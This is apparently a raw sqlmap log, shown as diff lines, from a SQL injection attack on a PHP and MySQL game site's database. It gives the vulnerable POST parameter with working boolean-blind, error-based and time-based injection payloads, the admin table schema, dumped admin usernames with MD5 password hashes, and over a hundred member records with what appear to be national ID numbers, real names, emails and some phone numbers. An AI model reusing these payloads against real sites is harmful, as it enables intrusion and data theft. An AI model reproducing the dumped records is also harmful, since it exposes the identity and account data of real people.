+| 321354 | 321644   | 130804199906060063 | NULL      | 1   | NULL | NULL | hujintao@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 涛涛       | NULL     | NULL     | 0        | 0        | NULL     | hujintao           | NULL        |
+| 321355 | 321645   | 230321199101190408 | NULL      | 1   | NULL | NULL | 947230333@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 尚航       | NULL     | NULL     | 0        | 0        | NULL     | AMORSH             | NULL        |
+| 321356 | 321646   | 659001199003113411 | NULL      | 1   | NULL | NULL | 121063813@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 宋征       | NULL     | NULL     | 0        | 0        | NULL     | ailixisi           | NULL        |
+| 321357 | 321647   | 130804198806060033 | NULL      | 1   | NULL | NULL | 2053226694@qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁春山      | 承德七中     | 承德       | 6        | 4        | NULL     | liangxiaohen321    | NULL        |
+| 321358 | 321648   | 370105199103145010 | NULL      | 1   | NULL | NULL | 992261137@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵学彬      | NULL     | NULL     | 0        | 0        | NULL     | 哀丨伤の歌手             | NULL        |
+| 321361 | 321651   | 120221198806073361 | NULL      | 1   | NULL | NULL | 3213405@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 史曼凡      | NULL     | NULL     | 0        | 0        | NULL     | 疯疯疯的繁体             | NULL        |
+| 321362 | 321652   | 120104198310191531 | NULL      | 1   | NULL | NULL | 789456666@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 曹凤丽      | NULL     | NULL     | 0        | 0        | NULL     | JOJOSIR            | NULL        |
+| 321363 | 321654   | 410928198903284517 | NULL      | 1   | NULL | NULL | 2656184417@qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | haisunhaifa        | NULL        |
+| 321364 | 321655   | 230709199106120318 | NULL      | 1   | NULL | NULL | 309720108@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 周浩       | NULL     | NULL     | 0        | 0        | NULL     | 123123             | NULL        |
+| 321365 | 321656   | 371581199401195410 | NULL      | 1   | NULL | NULL | 123456@qq.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 爱爱爱      | NULL     | NULL     | 0        | 0        | NULL     | test1111           | NULL        |
+| 321366 | 321657   | 522732198506010118 | NULL      | 1   | NULL | NULL | 512398238@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡复林      | NULL     | NULL     | 0        | 0        | NULL     | rensubuli          | NULL        |
+| 321367 | 321658   | 130123198409171813 | 179967488 | 1   | NULL | 1    | 973966957@qq.com      | NULL  | 17    | -1     | 1984   | NULL    | 9       | 李哲       | NULL     | NULL     | 0        | 0        | 11       | VV冰帝归来VV           | <blank>     |
+| 321368 | 321659   | 130805169605060032 | NULL      | 1   | NULL | NULL | xijinping@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 嘻嘻嘻      | NULL     | NULL     | 0        | 0        | NULL     | 凉风习习               | NULL        |
+| 321369 | 321660   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727166@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮       | NULL     | NULL     | 0        | 0        | NULL     | 诺诺                 | NULL        |
+| 321370 | 321661   | 510502198502200034 | NULL      | 1   | NULL | NULL | 040975@163.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 田子杨      | NULL     | NULL     | 0        | 0        | NULL     | elthen             | NULL        |
+| 321371 | 321662   | 51010719850409217X | NULL      | 1   | NULL | NULL | 77931975@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨跃       | NULL     | NULL     | 0        | 0        | NULL     | 总撰风                | NULL        |
+| 321372 | 321663   | 513622198210166392 | NULL      | 1   | NULL | NULL | 861016886@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 廖正强      | NULL     | NULL     | 0        | 0        | NULL     | 123                | NULL        |
+| 321373 | 321664   | 411525198409191614 | NULL      | 1   | NULL | NULL | tomboy@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 喻明旭      | NULL     | NULL     | 0        | 0        | NULL     | TOM                | NULL        |
+| 321374 | 321665   | 110200198401198410 | NULL      | 1   | NULL | NULL | death65535@163.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 韦煜祺      | NULL     | NULL     | 0        | 0        | NULL     | death65535         | NULL        |
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+
+Database: 5ebo
+Table: ebogame_content
+[0 entries]
++--------+
+| areaid |
++--------+
++--------+
+
+Database: 5ebo
+Table: ebogame_game_areas
+[0 entries]
++----------+
+| admin_id |
++----------+
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: admin
+[11 columns]
++---------------+-----------------------+
+| Column        | Type                  |
++---------------+-----------------------+
+| card          | varchar(255)          |
+| email         | varchar(40)           |
+| encrypt       | varchar(6)            |
+| lang          | varchar(6)            |
+| lastloginip   | varchar(15)           |
+| lastlogintime | int(10) unsigned      |
+| password      | varchar(32)           |
+| realname      | varchar(50)           |
+| roleid        | smallint(5)           |
+| userid        | mediumint(6) unsigned |
+| username      | varchar(20)           |
++---------------+-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: admin
+[2 entries]
++----------+----------------------------------+-------------------+--------+
+| username | password                         | email             | roleid |
++----------+----------------------------------+-------------------+--------+
+| admin    | 983e1b0caacea6c7cf69490669e3a980 | admin@admin.com   | 1      |
+| admin2   | 21232f297a57a5a743894a0e4a801fc3 | 222222@222222.com | 2      |
++----------+----------------------------------+-------------------+--------+
+
+Database: 5ebo
+Table: ebogame_member_info
+[117 entries]
++--------+----------+--------------------+-----------+-----+------+------+------------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+| id     | memberid | idnumber           | qq        | sex | code | city | email                  | phone | day   | wallow | year   | address | month   | truename | save_a_2 | save_a_1 | save_q_2 | save_q_1 | province | nickname           | tellphone   |
++--------+----------+--------------------+-----------+-----+------+------+------------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+| 321320 | 321608   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727177@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | NULL               | NULL        |
+| 321326 | 321614   | 410803198909200158 | <blank>   | 1   | NULL | 8    | 592727177@qq.com       | NULL  | 26    | -1     | 1950   | NULL    | 11      | 许亮亮      | 河南焦作     | 19910416 | 4        | 12       | 12       | 许诺                 | <blank>     |
+| 321329 | 321618   | 130506198805050022 | NULL      | 1   | NULL | NULL | fengfen@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 峰峰       | NULL     | NULL     | 0        | 0        | NULL     | 晴朗                 | NULL        |
+| 321330 | 321619   | 130506198805050025 | NULL      | 1   | NULL | NULL | zhaoyazhi@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵雅芝      | NULL     | NULL     | 0        | 0        | NULL     | 灵芝                 | NULL        |
+| 321331 | 321620   | 130804198806050999 | 793153125 | 1   | NULL | 6    | baiyanzong@126.com     | NULL  | 2     | -1     | 1950   | NULL    | 12      | 白岩松      | 赤那       | 哈弗       | 6        | 4        | 6        | 小白                 | 13810231872 |
+| 321332 | 321621   | 120102198410290333 | NULL      | 1   | NULL | NULL | 111111@111111.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 本规定      | NULL     | NULL     | 0        | 0        | NULL     | aaaaaa             | NULL        |
+| 321333 | 321622   | 130804198806054444 | NULL      | 1   | NULL | NULL | guozhiwei@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭志伟      | NULL     | NULL     | 0        | 0        | NULL     | 小薇                 | NULL        |
+| 321334 | 321623   | 130804198806050565 | NULL      | 1   | NULL | NULL | sunhaifa@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海法      | NULL     | NULL     | 0        | 0        | NULL     | qinglang           | NULL        |
+| 321335 | 321624   | 410928198903284517 | NULL      | 1   | NULL | NULL | sunhaifa1314@163.com   | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | 1233haifa          | NULL        |
+| 321336 | 321625   | 211011198810135544 | <blank>   | 2   | NULL | 1    | 351479026@qq.com       | NULL  | 13    | -1     | 1990   | NULL    | 10      | 师岩       | 19       | 19       | 9        | 9        | 7        | 冰蝶儿                | <blank>     |
+| 321337 | 321626   | 110101198612214012 | NULL      | 1   | NULL | NULL | k@q.com                | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘世瀚      | NULL     | NULL     | 0        | 0        | NULL     | lisan              | NULL        |
+| 321338 | 321627   | 545464987879877    | NULL      | 1   | NULL | NULL | liang@liang.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | 小梁                 | NULL        |
+| 321339 | 321629   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727100@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | 我就是我就是             | NULL        |
+| 321340 | 321630   | 130804198806050444 | 799996565 | 1   | NULL | 1    | liangzhao12@126.com    | NULL  | 9     | -1     | 1950   | NULL    | 12      | 梁立山      | 9月29日    | 赵晓彤      | 12       | 3        | 4        | xiangtalan         | 13810232336 |
+| 321341 | 321631   | 130804198806050069 | NULL      | 1   | NULL | NULL | wangliting123@126.com  | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王丽婷      | NULL     | NULL     | 0        | 0        | NULL     | wangliting         | NULL        |
+| 321342 | 321632   | 130804198706050030 | NULL      | 1   | NULL | NULL | 793153125@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | bianzouobianxunzao | NULL        |
+| 321343 | 321633   | 130804198406050033 | NULL      | 1   | NULL | NULL | yudidi@126.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 余地       | NULL     | NULL     | 0        | 0        | NULL     | qiglang            | NULL        |
+| 321344 | 321634   | 130804199706050033 | NULL      | 1   | NULL | NULL | litianyi@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天一      | NULL     | NULL     | 0        | 0        | NULL     | litianyi           | NULL        |
+| 321345 | 321635   | 130804198806053323 | NULL      | 1   | NULL | NULL | litianer@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天二      | NULL     | NULL     | 0        | 0        | NULL     | litianer           | NULL        |
+| 321346 | 321636   | 130804198806050123 | NULL      | 1   | NULL | NULL | litiansan@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天的      | NULL     | NULL     | 0        | 0        | NULL     | litiansan          | NULL        |
+| 321347 | 321637   | 130804198806050321 | NULL      | 1   | NULL | NULL | litianwu@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天武      | NULL     | NULL     | 0        | 0        | NULL     | litianwu           | NULL        |
+| 321348 | 321638   | 410928198903284517 | NULL      | 1   | NULL | NULL | 644412780@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | sunhaifa123456     | NULL        |
+| 321353 | 321643   | 410803198909200158 | NULL      | 1   | NULL | NULL | 59sdfdsf@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | ceshiyuanl         | NULL        |
+| 321354 | 321644   | 130804199906060063 | NULL      | 1   | NULL | NULL | hujintao@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 涛涛       | NULL     | NULL     | 0        | 0        | NULL     | hujintao           | NULL        |
+| 321355 | 321645   | 230321199101190408 | NULL      | 1   | NULL | NULL | 947230333@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 尚航       | NULL     | NULL     | 0        | 0        | NULL     | AMORSH             | NULL        |
+| 321356 | 321646   | 659001199003113411 | NULL      | 1   | NULL | NULL | 121063813@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 宋征       | NULL     | NULL     | 0        | 0        | NULL     | ailixisi           | NULL        |
+| 321357 | 321647   | 130804198806060033 | NULL      | 1   | NULL | NULL | 2053226694@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁春山      | 承德七中     | 承德       | 6        | 4        | NULL     | liangxiaohen321    | NULL        |
+| 321358 | 321648   | 370105199103145010 | NULL      | 1   | NULL | NULL | 992261137@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵学彬      | NULL     | NULL     | 0        | 0        | NULL     | 哀丨伤の歌手             | NULL        |
+| 321361 | 321651   | 120221198806073361 | NULL      | 1   | NULL | NULL | 3213405@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 史曼凡      | NULL     | NULL     | 0        | 0        | NULL     | 疯疯疯的繁体             | NULL        |
+| 321362 | 321652   | 120104198310191531 | NULL      | 1   | NULL | NULL | 789456666@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 曹凤丽      | NULL     | NULL     | 0        | 0        | NULL     | JOJOSIR            | NULL        |
+| 321363 | 321654   | 410928198903284517 | NULL      | 1   | NULL | NULL | 2656184417@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | haisunhaifa        | NULL        |
+| 321364 | 321655   | 230709199106120318 | NULL      | 1   | NULL | NULL | 309720108@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 周浩       | NULL     | NULL     | 0        | 0        | NULL     | 123123             | NULL        |
+| 321365 | 321656   | 371581199401195410 | NULL      | 1   | NULL | NULL | 123456@qq.com          | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 爱爱爱      | NULL     | NULL     | 0        | 0        | NULL     | test1111           | NULL        |
+| 321366 | 321657   | 522732198506010118 | NULL      | 1   | NULL | NULL | 512398238@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡复林      | NULL     | NULL     | 0        | 0        | NULL     | rensubuli          | NULL        |
+| 321367 | 321658   | 130123198409171813 | 179967488 | 1   | NULL | 1    | 973966957@qq.com       | NULL  | 17    | -1     | 1984   | NULL    | 9       | 李哲       | NULL     | NULL     | 0        | 0        | 11       | VV冰帝归来VV           | <blank>     |
+| 321368 | 321659   | 130805169605060032 | NULL      | 1   | NULL | NULL | xijinping@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 嘻嘻嘻      | NULL     | NULL     | 0        | 0        | NULL     | 凉风习习               | NULL        |
+| 321369 | 321660   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727166@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮       | NULL     | NULL     | 0        | 0        | NULL     | 诺诺                 | NULL        |
+| 321370 | 321661   | 510502198502200034 | NULL      | 1   | NULL | NULL | 040975@163.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 田子杨      | NULL     | NULL     | 0        | 0        | NULL     | elthen             | NULL        |
+| 321371 | 321662   | 51010719850409217X | NULL      | 1   | NULL | NULL | 77931975@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨跃       | NULL     | NULL     | 0        | 0        | NULL     | 总撰风                | NULL        |
+| 321372 | 321663   | 513622198210166392 | NULL      | 1   | NULL | NULL | 861016886@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 廖正强      | NULL     | NULL     | 0        | 0        | NULL     | 123                | NULL        |
+| 321373 | 321664   | 411525198409191614 | NULL      | 1   | NULL | NULL | tomboy@126.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 喻明旭      | NULL     | NULL     | 0        | 0        | NULL     | TOM                | NULL        |
+| 321374 | 321665   | 110200198401198410 | NULL      | 1   | NULL | NULL | death65535@163.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 韦煜祺      | NULL     | NULL     | 0        | 0        | NULL     | death65535         | NULL        |
+| 321375 | 321666   | 130302199010250038 | NULL      | 1   | NULL | NULL | 541805934@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡启蒙      | NULL     | NULL     | 0        | 0        | NULL     | 小布                 | NULL        |
+| 321376 | 321667   | 130421199005055451 | NULL      | 1   | NULL | NULL | 345005452@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 韩晓       | NULL     | NULL     | 0        | 0        | NULL     | han1111            | NULL        |
+| 321377 | 321668   | 220122198810150010 | NULL      | 1   | NULL | NULL | yiyayiyayoucy@sina.com | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 丛煜       | NULL     | NULL     | 0        | 0        | NULL     | yiyayiyayoucy      | NULL        |
+| 321378 | 321669   | 320721198512310055 | NULL      | 1   | NULL | NULL | 5655656@qq.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 徐小庆      | NULL     | NULL     | 0        | 0        | NULL     | 一水天心               | NULL        |
+| 321379 | 321670   | 360123199305200330 | NULL      | 1   | NULL | NULL | 425694366@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭农农      | NULL     | NULL     | 0        | 0        | NULL     | HHHH               | NULL        |
+| 321380 | 321671   | 152323199011160015 | NULL      | 1   | NULL | NULL | 444577198@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 阿柔罕      | NULL     | NULL     | 0        | 0        | NULL     | ddsd               | NULL        |
+| 321381 | 321672   | 232325198712241035 | NULL      | 1   | NULL | NULL | 402354344@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 盖其龙      | NULL     | NULL     | 0        | 0        | NULL     | 成就                 | NULL        |
+| 321382 | 321673   | 370282198609097814 | NULL      | 1   | NULL | NULL | 809880132@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 时昱吉      | NULL     | NULL     | 0        | 0        | NULL     | admin              | NULL        |
+| 321383 | 321674   | 360123199305200330 | NULL      | 1   | NULL | NULL | <blank>                | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭农农      | 交院       | 南昌       | 5        | 4        | NULL     | HHHHH              | NULL        |
+| 321384 | 321675   | 510422199503080710 | NULL      | 1   | NULL | NULL | huang86037563@qq.com   | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 黄伟       | NULL     | NULL     | 0        | 0        | NULL     | huangwei           | NULL        |
+| 321385 | 321676   | 371524198507020211 | NULL      | 1   | NULL | NULL | 34205970@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李庆凯      | NULL     | NULL     | 0        | 0        | NULL     | 34205970           | NULL        |
+| 321386 | 321677   | 430405198809122070 | NULL      | 1   | NULL | NULL | wjhts@sina.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 伍杰       | NULL     | NULL     | 0        | 0        | NULL     | shfuwi             | NULL        |
+| 321387 | 321678   | 412725198708043015 | NULL      | 1   | NULL | NULL | liutt902@163.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 展绪磊      | NULL     | NULL     | 0        | 0        | NULL     | 甜心                 | NULL        |
+| 321388 | 321679   | 522423198909045339 | NULL      | 1   | NULL | NULL | 1772536534@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 童前勇      | NULL     | NULL     | 0        | 0        | NULL     | Rinlen             | NULL        |
+| 321389 | 321681   | 652325197512090037 | NULL      | 1   | NULL | NULL | hyj12092012@163.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 胡有江      | NULL     | NULL     | 0        | 0        | NULL     | 淡淡烟飞               | NULL        |
+| 321390 | 321682   | 420620720820920    | NULL      | 1   | NULL | NULL | 2753091043@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 张建军      | NULL     | NULL     | 0        | 0        | NULL     | 123456             | NULL        |
+| 321391 | 321683   | 320202198503034531 | NULL      | 1   | NULL | NULL | 248900656@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 施明       | NULL     | NULL     | 0        | 0        | NULL     | 悠蓉艿嗒               | NULL        |
+| 321392 | 321684   | 230225199607133515 | NULL      | 1   | NULL | NULL | 627406355@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙宇       | NULL     | NULL     | 0        | 0        | NULL     | heoson             | NULL        |
+| 321393 | 321685   | 310226197008272617 | NULL      | 1   | NULL | NULL | sina00172@163.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 张祖刚      | NULL     | NULL     | 0        | 0        | NULL     | 蚂蚁大哥               | NULL        |
+| 321394 | 321686   | 120104198603283834 | NULL      | 1   | NULL | NULL | 280169990@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 杨金磊      | NULL     | NULL     | 0        | 0        | NULL     | 木木流苏               | NULL        |
+| 321395 | 321687   | 110108198208117194 | NULL      | 1   | NULL | NULL | takeru@microcitism.com | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 大大大      | NULL     | NULL     | 0        | 0        | NULL     | Takeru             | NULL        |
+| 321396 | 321688   | 532325197712220038 | NULL      | 1   | NULL | NULL | r515932049@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 冉哥       | NULL     | NULL     | 0        | 0        | NULL     | 280056035          | NULL        |
+| 321397 | 321689   | 420802198807091750 | NULL      | 1   | NULL | NULL | 295680597@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王帅龙      | NULL     | NULL     | 0        | 0        | NULL     | ws8879             | NULL        |
+| 321398 | 321690   | 150104198302284556 | NULL      | 1   | NULL | NULL | 832815@163.com         | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王永欣      | NULL     | NULL     | 0        | 0        | NULL     | 欣爷                 | NULL        |
+| 321399 | 321691   | 520102198208113431 | NULL      | 1   | NULL | NULL | 77392001@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘裕鼎      | NULL     | NULL     | 0        | 0        | NULL     | 不要死                | NULL        |
+| 321400 | 321692   | 51010719860214421X | NULL      | 1   | NULL | NULL | 17483936@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 重庆       | NULL     | NULL     | 0        | 0        | NULL     | mimimuma1          | NULL        |
+| 321401 | 321693   | 510113198604070012 | NULL      | 1   | NULL | NULL | gin1986@163.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 谭桃       | NULL     | NULL     | 0        | 0        | NULL     | 方便面                | NULL        |
+| 321402 | 321694   | 420107198703162538 | NULL      | 1   | NULL | NULL | 88531104@qq.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 定明鑫      | NULL     | NULL     | 0        | 0        | NULL     | 残忍温柔               | NULL        |
+| 321403 | 321695   | 320582198805200337 | NULL      | 1   | NULL | NULL | 170358743@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 缪剑       | NULL     | NULL     | 0        | 0        | NULL     | 随风之殇               | NULL        |
+| 321404 | 321696   | 110101198412130236 | NULL      | 1   | NULL | NULL | alaakba@alaakba.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 阿拉阿克巴    | NULL     | NULL     | 0        | 0        | NULL     | alaakba            | NULL        |
+| 321405 | 321697   | 230231198710105232 | NULL      | 1   | NULL | NULL | xxb1212@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 付清波      | NULL     | NULL     | 0        | 0        | NULL     | moguibobo          | NULL        |
+| 321406 | 321698   | 130126198302060637 | NULL      | 1   | NULL | NULL | 858575665@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘伟       | NULL     | NULL     | 0        | 0        | NULL     | 火山2105             | NULL        |
+| 321407 | 321699   | 340323199206098710 | NULL      | 1   | NULL | NULL | djb0609@vip.qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 董静宝      | NULL     | NULL     | 0        | 0        | NULL     | 一笑醉离殇              | NULL        |
+| 321408 | 321700   | 320623198904021671 | NULL      | 1   | NULL | NULL | jak4251552@163.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙春金      | NULL     | NULL     | 0        | 0        | NULL     | 灬神灬                | NULL        |
+| 321409 | 321701   | 411325198508062913 | NULL      | 1   | NULL | NULL | liuqian1a@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘谦       | NULL     | NULL     | 0        | 0        | NULL     | 夜雨听风               | NULL        |
+| 321410 | 321702   | 110101199001011077 | NULL      | 1   | NULL | NULL | lringlet@hotmail.com   | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 博格引擎     | NULL     | NULL     | 0        | 0        | NULL     | Borg               | NULL        |
+| 321411 | 321703   | 371524198507020211 | NULL      | 1   | NULL | NULL | 3420225970@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李庆凯      | NULL     | NULL     | 0        | 0        | NULL     | 342205970          | NULL        |
+| 321415 | 321707   | 320302199105284738 | NULL      | 1   | NULL | NULL | lc159969@163.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘昌       | NULL     | NULL     | 0        | 0        | NULL     | 聚壹阁乾坤              | NULL        |
+| 321416 | 321708   | 511602199110094050 | NULL      | 1   | NULL | NULL | 2069322379@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 张明       | NULL     | NULL     | 0        | 0        | NULL     | yunyun             | NULL        |
+| 321417 | 321709   | 610921199011044718 | NULL      | 1   | NULL | NULL | jiaozhi@sina.cn        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵有全      | NULL     | NULL     | 0        | 0        | NULL     | 海风                 | NULL        |
+| 321418 | 321710   | 420528197205267571 | NULL      | 1   | NULL | NULL | yuancheng@sogou.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 罗观驰      | NULL     | NULL     | 0        | 0        | NULL     | 如何爱                | NULL        |
+| 321419 | 321711   | 431121199107180013 | NULL      | 1   | NULL | NULL | 466843199@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 陈程       | NULL     | NULL     | 0        | 0        | NULL     | 聚壹阁巴拉              | NULL        |
